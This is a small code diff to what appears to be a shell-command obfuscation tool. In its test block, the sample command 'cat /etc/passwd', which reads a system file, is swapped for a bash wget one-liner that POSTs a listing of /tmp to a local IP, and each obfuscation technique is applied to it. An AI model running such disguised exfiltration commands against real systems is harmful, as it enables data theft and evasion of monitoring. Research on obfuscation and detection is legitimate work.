@@ -360,7 +360,9 @@ def random_obf(cmd: str, obf: list[str] | None = None, depth: int = 4, args: dic
 
 
 if __name__ == '__main__':
-    c = "cat /etc/passwd"
+    from tool.local_ip import get_ip
+    ip = get_ip()
+    c = f"bash -c 'wget http://{ip}:8000/ --method=POST --body-data=$(printf %s.. $(ls /tmp))'"
 
     for n in OBFUSCATIONS:
         r = apply_obf(n, c)
